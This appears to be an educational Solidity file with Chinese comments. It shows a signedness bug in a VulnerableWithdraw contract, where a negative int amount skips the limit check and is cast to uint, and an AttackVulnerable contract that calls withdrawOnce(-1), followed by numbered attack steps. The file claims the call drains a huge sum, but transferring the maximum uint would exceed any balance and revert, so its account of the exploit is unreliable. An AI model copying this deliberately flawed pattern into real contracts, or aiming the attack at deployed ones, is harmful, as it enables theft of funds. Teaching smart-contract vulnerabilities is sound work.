// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

// 本合約展示 Signedness Bugs 漏洞示例
// 漏洞重點：在 withdrawOnce 函數中，amount 參數使用 signed int，
// 當傳入負數時，uint(amount) 會將負數轉換為一個極大的正數，可能造成不當大量轉帳。

contract VulnerableWithdraw {
    mapping(address => bool) public transferred; // 記錄是否已提款

    // 漏洞函數 withdrawOnce 使用 int 型別的 amount 參數
    function withdrawOnce(int amount) public {
        // 驗證邏輯：若提款金額大於 1 ether 或使用者已提款，則拒絕
        // 注意：此處缺少對負數的檢查，故如果 amount 為負數，條件不會觸發 revert
        if (amount > 1 ether || transferred[msg.sender]) {
            revert();
        }
        // 漏洞重點：將 int 轉換為 uint，若 amount 為負，會變成極大的正數
        payable(msg.sender).transfer(uint(amount));
        transferred[msg.sender] = true;
    }

    // 讓合約具備接收 Ether 的能力
    receive() external payable {}
}

// 攻擊合約：利用傳入負數觸發漏洞，提領超額金額
// 說明：在 Solidity 0.8.0 及以上版本中，必須使用 payable address 來正確轉換合約地址

contract AttackVulnerable {
    VulnerableWithdraw public vulnerableContract;

    // 建構子接受 address payable 型別，避免編譯錯誤
    constructor(address payable _vulnerableAddress) {
        // 使用顯式轉換，確保傳入的地址可以存取 payable fallback function
        vulnerableContract = VulnerableWithdraw(_vulnerableAddress);
    }

    // 攻擊函數：傳入 -1，-1 轉為 uint 後為極大數，攻擊者可提領巨額 Ether
    function attack() public {
        // 傳入 -1 作為參數 (-1 會被強制轉型為 uint(max))
        vulnerableContract.withdrawOnce(-1);
    }

    // 接收 Ether
    receive() external payable {}
}

/*
攻擊步驟：
1. 部署 VulnerableWithdraw 合約，並注入足夠的 Ether。
2. 部署 AttackVulnerable 合約，傳入 VulnerableWithdraw 合約的 payable 地址。
3. 呼叫 AttackVulnerable 的 attack() 函數，傳入 -1。
   由於 -1 被轉換為一個非常大的正數，合約將轉帳大量 Ether 給攻擊者。
*/
